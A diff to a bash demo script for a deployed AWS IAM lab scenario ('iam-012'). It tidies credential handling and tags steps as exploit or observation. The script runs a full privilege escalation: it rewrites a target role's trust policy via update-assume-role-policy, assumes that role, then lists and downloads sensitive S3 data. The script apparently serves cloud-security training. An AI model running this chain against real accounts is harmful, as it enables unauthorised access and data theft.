@@ -57,23 +57,48 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials and ARNs
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
 TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
 BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity as user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify identity as user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+use_starting_creds
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
@@ -84,11 +109,12 @@ if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 
-# Step 3: Assume the starting role
+# [EXPLOIT] Step 3: Assume the starting role
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $STARTING_ROLE_ARN"
+use_starting_creds
 
-show_cmd "Attacker" "aws sts assume-role --role-arn "$STARTING_ROLE_ARN" --role-session-name "iam-012-demo-session""
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-012-demo-session\""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$STARTING_ROLE_ARN" \
     --role-session-name "iam-012-demo-session")
@@ -100,11 +126,12 @@ export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.Sess
 
 echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 
-# Step 4: Check current trust policy of target role
+# [OBSERVATION] Step 4: Check current trust policy of target role
 echo -e "${YELLOW}Step 4: Checking current trust policy of target role${NC}"
 echo "Target role ARN: $TARGET_ROLE_ARN"
+use_readonly_creds
 
-show_cmd "Attacker" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
+show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
 CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json)
 echo "Current trust policy:"
 echo "$CURRENT_TRUST_POLICY" | jq '.'
@@ -112,9 +139,13 @@ echo "$CURRENT_TRUST_POLICY" | jq '.'
 # Save original trust policy for cleanup
 echo "$CURRENT_TRUST_POLICY" > /tmp/original_trust_policy_iam_012_bucket.json
 
-# Try to assume the target role (should fail)
+# Try to assume the target role (should fail) - switch back to starting role session
+export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
+
 echo -e "\n${YELLOW}Attempting to assume target role (should fail)...${NC}"
-show_cmd "Attacker" "aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session"
+show_cmd "Attacker" "aws sts assume-role --role-arn \"$TARGET_ROLE_ARN\" --role-session-name test-session"
 if aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly able to assume target role already${NC}"
 else
@@ -122,9 +153,10 @@ else
 fi
 echo ""
 
-# Step 5: Verify we don't have S3 bucket access yet
+# [EXPLOIT] Step 5: Verify we don't have S3 bucket access yet
 echo -e "${YELLOW}Step 5: Verifying we don't have S3 bucket access yet${NC}"
 echo "Attempting to list S3 bucket contents (should fail)..."
+# Still using starting role session credentials set above
 show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
@@ -133,7 +165,7 @@ else
 fi
 echo ""
 
-# Step 6: Update the trust policy to allow our role to assume it
+# [EXPLOIT] Step 6: Update the trust policy to allow our role to assume it
 echo -e "${YELLOW}Step 6: Updating trust policy via iam:UpdateAssumeRolePolicy${NC}"
 echo "Modifying target role trust policy to allow $STARTING_ROLE to assume it..."
 
@@ -156,8 +188,8 @@ EOF
 echo "New trust policy to be applied:"
 echo "$NEW_TRUST_POLICY" | jq '.'
 
-# Update the trust policy
-show_attack_cmd "Attacker" "aws iam update-assume-role-policy --role-name $TARGET_ROLE --policy-document "$NEW_TRUST_POLICY""
+# Update the trust policy (using starting role session credentials still active from step 3)
+show_attack_cmd "Attacker" "aws iam update-assume-role-policy --role-name $TARGET_ROLE --policy-document \"$NEW_TRUST_POLICY\""
 aws iam update-assume-role-policy \
     --role-name $TARGET_ROLE \
     --policy-document "$NEW_TRUST_POLICY"
@@ -169,9 +201,10 @@ echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
 sleep 15
 echo ""
 
-# Step 7: Assume the target role
+# [EXPLOIT] Step 7: Assume the target role
 echo -e "${YELLOW}Step 7: Assuming the target role${NC}"
-show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name bucket-access-session --output json"
+# Still using starting role session credentials from step 3
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$TARGET_ROLE_ARN\" --role-session-name bucket-access-session --output json"
 TARGET_CREDENTIALS=$(aws sts assume-role \
     --role-arn "$TARGET_ROLE_ARN" \
     --role-session-name bucket-access-session \
@@ -188,7 +221,7 @@ TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target role!${NC}\n"
 
-# Step 8: Access the S3 bucket
+# [EXPLOIT] Step 8: Access the S3 bucket
 echo -e "${YELLOW}Step 8: Accessing S3 bucket${NC}"
 echo "Target bucket: $BUCKET_NAME"
 echo "Listing bucket contents..."
@@ -197,7 +230,7 @@ show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"
 
-# Step 9: Download sensitive data
+# [EXPLOIT] Step 9: Download sensitive data
 echo -e "${YELLOW}Step 9: Downloading sensitive data${NC}"
 DOWNLOAD_FILE="/tmp/iam-012-sensitive-data.txt"
 show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
